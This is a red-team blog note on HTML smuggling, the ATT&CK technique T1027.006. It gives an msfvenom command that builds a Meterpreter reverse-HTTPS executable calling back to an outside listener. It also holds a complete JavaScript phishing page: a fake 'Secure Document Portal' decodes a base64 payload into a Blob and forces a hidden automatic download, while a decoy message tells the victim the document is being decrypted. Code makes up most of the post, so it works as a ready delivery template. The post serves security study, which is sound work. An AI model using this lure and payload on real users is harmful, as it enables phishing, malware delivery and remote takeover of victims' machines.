---
title: HTML Smuggling
description: Red Team Shorts - HTML Smuggling. A client-side delivery technique that leverages HTML5 and JavaScript features to bypass perimeter security controls, encode malicious payloads and deliver them to the victim's local systems.
author: victor_contreras
date: 2026-04-22 01:33:00 +0800
categories: [Red Team, Notes, HTML Smuggling]
tags: [RedTeam, Notes, HTMLSmuggling]
math: true
mermaid: true
image:
  path: /assets/img/posts/Red-Teaming/The_Muddy_Road_and_The_Long_Wait.webp
  alt: The Muddy Road and The Long Wait. Either embrace the mess of progress, or get comfortable with the dust of standing still
---

# HTML Smuggling

> I am not an expert in the red teaming field and I do not pretend to be. I am here just to share a few short notes of the techniques I have been learning about this interesting area.
{: .prompt-warning }

HTML Smuggling is a client-side delivery technique that leverages HTML5 and JavaScript features to bypass perimeter security controls. HTML Smuggling encodes the binary payload directly into an HTML or JS file. The browser then reconstructs the file locally using certain JavaScript APIs and functions to deliver the malicious payload to the victim's system. This is a common phishing technique used to deliver malicious arbitrary files.

When a victim accesses an attacker-controlled server, the browser automatically executes the JavaScript files and uses a `Blob` object and the `URL.createObjectURL` or `msSaveOrOpenBlob` functions to construct the payload file locally in the browser’s memory and downloads it into the victim's machine.

## MITRE ATT&CK Framework

* T1027.006: Obfuscated Files or Information: HTML Smuggling

## Technique 1 - Direct Link

When a user clicks this link from an HTML5-compatible browser, the `msfstaged.exe` file will be automatically downloaded to the user's default download directory.

Generate msfstaged.exe

```Bash
sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.69 LPORT=443 -f exe -o msfstaged.exe
```

Web application to serve and offer the malicious code.

```HTML
<html>
    <body>
      <a href="/msfstaged.exe" download="msfstaged.exe">DownloadMe</a>
   </body>
</html>
```

## Technique 2 (better and the reason for this article) - Blob Invisible Anchor Tag

The following JavaScript code contains a `Blob` with the Meterpreter executable in `Base64`.

Download is triggered automatically after the victim visits the page. Unfortunately, a warning may be displayed due to the potentially unsafe file format.

```JavaScript
<!DOCTYPE html>
<html>
<head>
    <title>Secure Document Portal</title>
</head>
<body>
    <script>

        /*
         * Converts a Base64 encoded string into a raw binary ArrayBuffer.
         * This is the "Assembly" phase of HTML Smuggling.
         * @param {string} base64 - The encoded payload string.
         * @return {ArrayBuffer} - The raw bytes of the executable.
         */

        function base64ToArrayBuffer(base64) {
            // Decode the Base64 string into a binary string
            var binary_string = window.atob(base64);
            var len = binary_string.length;
            
            // Allocate a byte array to hold the raw binary data
            var bytes = new Uint8Array(len);
            
            // Map each character of the binary string to a byte in the array
            for (var i = 0; i < len; i++) { 
                bytes[i] = binary_string.charCodeAt(i); 
            }

            return bytes.buffer;
        }

        /* * PAYLOAD SECTION
        - Generation: sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.69 LPORT=443 -f exe -o msfstaged.exe
        - Encoding: base64 -w 0 msfstaged.exe
         */
        var file = 'TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAA...'; // Truncated for documentation
        var fileName = 'msfstaged.exe';

        // Process the Base64 payload into raw binary data
        var data = base64ToArrayBuffer(file);

        // Wrap raw data in a Blob object (MIME type octet/stream for generic binary)
        var blob = new Blob([data], {type: 'application/octet-stream'});

        /**
         * DELIVERY PHASE
         * Checks browser compatibility and triggers the local "smuggled" download.
         */

        // Compatibility check for legacy Internet Explorer (msSaveBlob)
        if (window.navigator.msSaveOrOpenBlob) {
            window.navigator.msSaveBlob(blob, fileName);
        } 
        else {
            // Logic for modern browsers (Chrome, Edge, Firefox)
            
            // 1. Create a hidden anchor (<a>) element
            var a = document.createElement('a');
            document.body.appendChild(a);
            a.style = 'display: none'; // Ensure the element is invisible

            // 2. Generate a temporary internal URL for the memory-resident Blob
            var url = window.URL.createObjectURL(blob);
            
            // 3. Configure the anchor to point to our Blob and set the filename
            a.href = url;
            a.download = fileName;
            
            // 4. Programmatically trigger a click to start the "download"
            a.click();

            // 5. Cleanup: Release the URL and remove the anchor from the DOM
            window.URL.revokeObjectURL(url);
            document.body.removeChild(a);
        }
    </script>
    
    <div style="font-family: sans-serif; text-align: center; margin-top: 50px;">
        <h2>Processing Secure File...</h2>
        <p>Your document "msfstaged.exe" is being decrypted and prepared for download.</p>
        <p>Please check your downloads folder.</p>
    </div>
</body>
</html>
```

## References

* [T1027.006 - HTML Smuggling](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.006/T1027.006.md)
* [HTML smuggling explained](https://www.outflank.nl/blog/2018/08/14/html-smuggling-explained/)